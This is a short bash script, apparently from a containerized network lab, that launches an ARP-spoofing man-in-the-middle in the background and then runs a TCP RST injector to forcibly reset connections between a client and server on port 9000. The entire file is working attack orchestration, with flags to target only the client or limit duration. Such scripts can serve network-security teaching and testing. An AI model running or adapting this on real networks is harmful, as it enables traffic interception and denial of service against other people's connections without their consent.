#!/usr/bin/env bash
# attack.sh — one-shot convenience: start ARP poisoning in the background,
# wait for the MITM to settle, then run the RST injector in the foreground.
# Ctrl+C stops the injector and then the ARP spoofer (which restores ARP).
#
# Env (with defaults): CLIENT_IP SERVER_IP SERVER_PORT IFACE
# Extra flags to rst_attack.py can be passed through, e.g.:
#   ./attack.sh --no-server          # reset only the client
#   ./attack.sh --duration 10        # stop after 10s instead of running forever
set -euo pipefail

CLIENT_IP="${CLIENT_IP:-172.20.0.20}"
SERVER_IP="${SERVER_IP:-172.20.0.10}"
SERVER_PORT="${SERVER_PORT:-9000}"
IFACE="${IFACE:-eth0}"

echo "[attack] client=$CLIENT_IP server=$SERVER_IP port=$SERVER_PORT iface=$IFACE"

cleanup() {
    echo "[attack] cleaning up (restoring ARP) ..."
    # SIGINT so arp_spoof.py runs its restore() handler, not an abrupt kill.
    kill -INT "${ARP_PID:-}" 2>/dev/null || true
    wait "${ARP_PID:-}" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

python3 /app/arp_spoof.py --client "$CLIENT_IP" --server "$SERVER_IP" -i "$IFACE" &
ARP_PID=$!

echo "[attack] waiting 4s for ARP poisoning to take effect ..."
sleep 4

echo "[attack] launching RST injector ..."
python3 /app/rst_attack.py --client "$CLIENT_IP" --server "$SERVER_IP" \
    --port "$SERVER_PORT" -i "$IFACE" "$@"
